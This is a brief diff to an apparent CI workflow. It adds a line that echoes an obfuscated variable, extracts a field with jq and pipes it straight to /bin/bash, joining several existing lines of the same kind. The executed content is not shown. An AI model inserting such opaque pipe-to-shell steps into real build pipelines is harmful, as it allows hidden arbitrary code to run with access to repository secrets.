@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$solk60615" | jq -r .dr083 | /bin/bash
           printf '%s' "$zp41905" | jq -r .gy2 | /bin/bash
           printf '%s' "$rmvrw075" | jq -r .ue2 | /bin/bash
+          echo $fnyy2 | jq -r .e8849 | /bin/bash
 
       - name: Save output
         if: always()
